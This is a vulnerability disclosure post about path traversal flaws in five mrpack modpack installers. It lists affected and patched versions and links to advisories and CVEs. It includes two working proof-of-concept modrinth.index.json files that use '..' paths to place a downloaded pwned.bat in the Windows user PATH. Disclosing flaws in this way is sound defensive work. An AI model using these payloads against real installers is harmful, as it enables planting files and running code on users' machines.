---
title: "Five vulnerabilities found in mrpack installer implementations"
date: 2023-02-04 17:00:00 -00:00
authors:
  - Ambre Bertucci
layout: /src/layouts/Post.astro
---

On Tuesday, 31st January, a member of the Quilt team discovered path traversal vulnerabilities in five different mrpack
implementations, affecting MultiMC, PolyMC, Prism Launcher, ATLauncher and mrpack-install.

This article serves as a write-up for the vulnerabilities, and the affected versions.

<!-- MORE -->

# Affected software

Below you can find a table detailing the affected and patched versions for each piece of software.

| Software       | Affected versions | Patched versions |
|----------------|-------------------|------------------|
| MultiMC        | <= 0.6.16         | >= 0.7.0         |
| PolyMC         | <= 1.4.3          | >= 5.0           |
| Prism Launcher | <= 6.1            | >= 6.2 ¹         |
| ATLauncher     | <= 3.4.26.0       | >= 3.4.27.0      |
| mrpack-install | <= 0.16.2         | >= 0.16.3        |

¹: version 6.2 of Prism Launcher contains a critical bug, we recommend installing 6.3.

We recommend every user to upgrade to a patched version. If you can't, we recommend you to inspect any mrpack before
installation.

# Vulnerability details

[mrpack](https://docs.modrinth.com/docs/modpacks/format_definition/) is a modpack format popularized by the [Modrinth®](https://modrinth.com)
mod sharing platform.

It allows modpack creators to define a [`files`](https://docs.modrinth.com/docs/modpacks/format_definition/#files) array
to download various files, such as mods, during modpack installation. This can be open to path traversals by using
an absolute path (if the implementation allows it) or relative directories (`/../`) to escape the installation
folder and install a file in any directory the process has access to.

# Attack vector

While we recognize installing a modpack requires trust into the modpack maker once the modpack is run, we're of the
opinion that installing a modpack shouldn't require trust. One scenario can also be imagined where one would install
a suspicious modpack for checking its content, leading to infection in the process.

Modrinth® confirmed they have checks in place preventing such a modpack from being installed, although this
vulnerability still affects modpacks installed off-site.

# Demonstration

Below you can find some example `modrinth.index.json` files that once put into a mrpack would install a `pwned` binary
inside the user PATH. They assume the relevant tool is installed at the default location, except for `mrpack-install`
which will depend on the execution location.

## MultiMC, PolyMC, Prism Launcher, mrpack-install

```json
{
  "formatVersion": 1,
  "game": "minecraft",
  "versionId": "exploit-demo",
  "name": "Exploit demo",
  "files": [
    {
      "path": "..\\..\\..\\..\\..\\..\\..\\AppData\\Local\\Microsoft\\WindowsApps\\pwned.bat",
      "hashes": {
        "sha1": "f2f2afa63f7c46d966b460c6efa85505ec8e7d26",
        "sha512": "88b0dfed128d1b1dac86ef825fad577bd2fe99d79a8eb73a826a6634e6d2edadfe2fd50aa69b1009c38c7f4d1bbdd7199e2425cf3035515a794646474b3b28e8"
      },
      "env": {
        "client": "required",
        "server": "required"
      },
      "downloads": [
        "https://raw.githubusercontent.com/Akarys42/pwned/main/pwned.bat"
      ],
      "fileSize": 200
    }
  ],
  "dependencies": {
    "minecraft": "1.18.2"
  }
}
```

## ATLauncher

```json
{
  "formatVersion": 1,
  "game": "minecraft",
  "versionId": "exploit-demo",
  "name": "Exploit demo",
  "files": [
    {
      "path": "../../../../Local/Microsoft/WindowsApps/pwned.bat",
      "hashes": {
        "sha1": "f2f2afa63f7c46d966b460c6efa85505ec8e7d26",
        "sha512": "88b0dfed128d1b1dac86ef825fad577bd2fe99d79a8eb73a826a6634e6d2edadfe2fd50aa69b1009c38c7f4d1bbdd7199e2425cf3035515a794646474b3b28e8"
      },
      "env": {
        "client": "required",
        "server": "required"
      },
      "downloads": [
        "https://raw.githubusercontent.com/Akarys42/pwned/main/pwned.bat"
      ],
      "fileSize": 200
    }
  ],
  "dependencies": {
    "minecraft": "1.18.2"
  }
}
```

# Advisories

* MultiMC: none
* PolyMC: [GHSA-3rfr-g9g9-7gx2](https://github.com/PolyMC/PolyMC/security/advisories/GHSA-3rfr-g9g9-7gx2)
* Prism Launcher: [GHSA-wxgx-8v36-mj2m](https://github.com/PrismLauncher/PrismLauncher/security/advisories/GHSA-wxgx-8v36-mj2m)
* ATLauncher: [GHSA-7cff-8xv4-mvx6](https://github.com/ATLauncher/ATLauncher/security/advisories/GHSA-7cff-8xv4-mvx6)
* mrpack-install: [GHSA-r887-gfxh-m9rr](https://github.com/nothub/mrpack-install/security/advisories/GHSA-r887-gfxh-m9rr)

# CVE entries

* MultiMC: [CVE-2023-25306](https://www.cve.org/CVERecord?id=CVE-2023-25306)
* PolyMC: [CVE-2023-25305](https://www.cve.org/CVERecord?id=CVE-2023-25305)
* Prism Launcher: [CVE-2023-25304](https://www.cve.org/CVERecord?id=CVE-2023-25304)
* ATLauncher: [CVE-2023-25303](https://www.cve.org/CVERecord?id=CVE-2023-25303)
* mrpack-install: [CVE-2023-25307](https://www.cve.org/CVERecord?id=CVE-2023-25307)

# Credits

Vulnerability found and blog post written by Ambre Bertucci (Akarys)

Research inspired by Silver
